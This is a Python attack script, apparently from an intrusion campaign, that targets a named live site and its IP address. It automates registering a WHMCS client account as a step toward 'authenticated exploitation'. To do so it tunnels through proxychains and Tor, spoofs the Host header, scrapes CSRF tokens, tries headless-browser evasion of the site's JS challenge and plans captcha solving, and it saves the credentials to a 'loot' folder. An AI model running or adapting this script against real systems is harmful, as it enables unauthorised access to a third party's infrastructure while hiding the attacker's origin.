#!/usr/bin/env python3
"""WHMCS Register - Create account for authenticated exploitation"""
import asyncio
import sys
import re
import time
import subprocess
from playwright.async_api import async_playwright

REGISTER_URL = "https://68.65.122.227/clients/register.php"
HOST = "8kiptv.co"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# Dados fictícios para registro
DATA = {
    "firstname": "Test",
    "lastname": "User",
    "email": "testuser@tempmail.xyz",
    "phonenumber": "+12345678901",
    "companyname": "Test Corp",
    "address1": "123 Test Street",
    "address2": "Apt 4B",
    "city": "Test City",
    "state": "TS",
    "postcode": "12345",
    "password": "TestPass123!",
    "password2": "TestPass123!",
    "language": "english",
}

async def try_register_curl():
    """Tenta registrar via curl (sem captcha se possivel)"""
    import subprocess
    
    # Primeiro obter CSRF
    cmd = [
        "proxychains4", "-q", "curl", "-sk",
        "-H", f"Host: {HOST}",
        "-A", UA,
        "-c", "/tmp/whmcs_reg_cookies.txt",
        "--connect-timeout", "15", "--max-time", "30",
        REGISTER_URL
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    page = result.stdout
    
    csrf_match = re.search(r'name="token"\s+value="([a-f0-9]+)"', page)
    if not csrf_match:
        print("[-] CSRF token not found")
        return False
    
    csrf = csrf_match.group(1)
    print(f"[+] CSRF token: {csrf}")
    
    # Check if captcha is present
    if 'default-captcha-domainchecker' in page and ('captcha' in page.lower()):
        print("[!] GD Captcha detected on register page")
        # Extract captcha image URL
        captcha_match = re.search(r'<img[^>]*src="([^"]*captcha[^"]*)"', page)
        if captcha_match:
            print(f"[!] Captcha image: {captcha_match.group(1)}")
    
    # Prepare POST data
    post_data = {
        "token": csrf,
        "register": "true",
        "language": "english",
        **DATA
    }
    
    post_str = "&".join(f"{k}={v}" for k, v in post_data.items())
    
    # Submit registration
    cmd2 = [
        "proxychains4", "-q", "curl", "-sk",
        "-H", f"Host: {HOST}",
        "-A", UA,
        "-b", "/tmp/whmcs_reg_cookies.txt",
        "-c", "/tmp/whmcs_reg_cookies2.txt",
        "-d", post_str,
        "-L",
        "--connect-timeout", "15", "--max-time", "30",
        "https://68.65.122.227/clients/register.php"
    ]
    
    result2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=30)
    response = result2.stdout
    status = result2.returncode
    
    print(f"[+] Response size: {len(response)}")
    
    # Check result
    if "clientarea" in response.lower() and "logout" in response.lower():
        print("\n*** REGISTRATION SUCCESSFUL! ***")
        print("Saved cookies to /tmp/whmcs_reg_cookies2.txt")
        
        # Save evidence
        with open("/home/ubuntu/8kiptv.co/loot/whmcs_account.txt", "w") as f:
            f.write("WHMCS Client Account\n")
            f.write(f"Email: {DATA['email']}\n")
            f.write(f"Password: {DATA['password']}\n")
            f.write(f"URL: https://8kiptv.co/clients/\n")
            f.write(f"Register URL: https://68.65.122.227/clients/register.php\n")
        
        return True
    elif "invalid" in response.lower() or "error" in response.lower():
        # Try to find error message
        err_match = re.search(r'class="alert[^"]*alert-danger[^"]*"[^>]*>(.*?)</div>', response, re.DOTALL)
        if err_match:
            print(f"[-] Error: {err_match.group(1).strip()}")
        # Check for captcha
        if "captcha" in response.lower() or "verification" in response.lower():
            print("[!] Captcha required after submission")
            return False
        return False
    else:
        print(f"[-] Unknown response (first 300 chars): {response[:300]}")
        return False

async def try_register_playwright():
    """Tenta registrar via Playwright (bypass JS Challenge)"""
    print("\n[*] Trying Playwright approach...")
    
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-dev-shm-usage',
                      '--proxy-server=socks5://127.0.0.1:9050']
            )
            
            context = await browser.new_context(
                user_agent=UA,
                viewport={"width": 1920, "height": 1080},
                ignore_https_errors=True,
            )
            
            page = await context.new_page()
            await page.goto(REGISTER_URL, wait_until="domcontentloaded", timeout=30000)
            await page.wait_for_timeout(3000)
            
            # Check if we got blocked
            content = await page.content()
            if "403" in content and "Forbidden" in content:
                print("[-] 403 Forbidden - Playwright blocked")
                await browser.close()
                return False
            
            if "Please wait" in content:
                print("[-] JS Challenge - Playwright cannot bypass")
                await browser.close()
                return False
            
            print("[+] Page loaded via Playwright!")
            
            # Fill form
            await page.fill('input[name="firstname"]', DATA["firstname"])
            await page.fill('input[name="lastname"]', DATA["lastname"])
            await page.fill('input[name="email"]', DATA["email"])
            await page.fill('input[name="phonenumber"]', DATA["phonenumber"])
            await page.fill('input[name="address1"]', DATA["address1"])
            await page.fill('input[name="city"]', DATA["city"])
            await page.fill('input[name="state"]', DATA["state"])
            await page.fill('input[name="postcode"]', DATA["postcode"])
            await page.fill('input[name="password"]', DATA["password"])
            await page.fill('input[name="password2"]', DATA["password2"])
            
            # Try to submit
            await page.click('input[type="submit"]')
            await page.wait_for_timeout(5000)
            
            result = await page.content()
            
            if "clientarea" in result.lower():
                print("\n*** REGISTRATION SUCCESSFUL via Playwright! ***")
                await browser.close()
                return True
            
            # Check for captcha
            if "captcha" in result.lower() and ("invalid" in result.lower() or "error" in result.lower()):
                print("[!] Captcha required, taking screenshot...")
                await page.screenshot(path="/home/ubuntu/8kiptv.co/evidence/captcha_screenshot.png")
                # Try to find captcha image
                captcha_img = await page.query_selector('#default-captcha-domainchecker img, .captchaimage img')
                if captcha_img:
                    img_src = await captcha_img.get_attribute('src')
                    print(f"[!] Captcha image src: {img_src}")
                    
                    if img_src and not img_src.startswith('http'):
                        img_url = f"https://68.65.122.227{img_src}" if img_src.startswith('/') else img_src
                        print(f"[!] Full captcha URL: {img_url}")
            
            await browser.close()
            return False
            
    except Exception as e:
        print(f"[-] Playwright error: {e}")
        return False

async def main():
    print("=" * 60)
    print("WHMCS Account Registration - 8kiptv.co")
    print("=" * 60)
    print(f"Target: {REGISTER_URL}")
    print(f"Email: {DATA['email']}")
    print()
    
    # Try curl first (no captcha bypass needed if no captcha on page)
    print("[*] Attempt 1: Direct curl registration...")
    result = await try_register_curl()
    
    if not result:
        print("\n[*] Attempt 2: Trying Playwright...")
        result = await try_register_playwright()
    
    if not result:
        print("\n[-] Registration failed. Possible reasons:")
        print("  1. GD Captcha required (need OCR)")
        print("  2. IP banned from registration")
        print("  3. Email already registered")
        print("\n[*] Trying with captcha solving...")
        # Here we would implement OCR/tesseract for GD captcha
        print("[!] GD Captcha solving not yet implemented")
        sys.exit(1)
    
    print("\n[+] Account created! Proceeding with authenticated exploitation...")

if __name__ == "__main__":
    asyncio.run(main())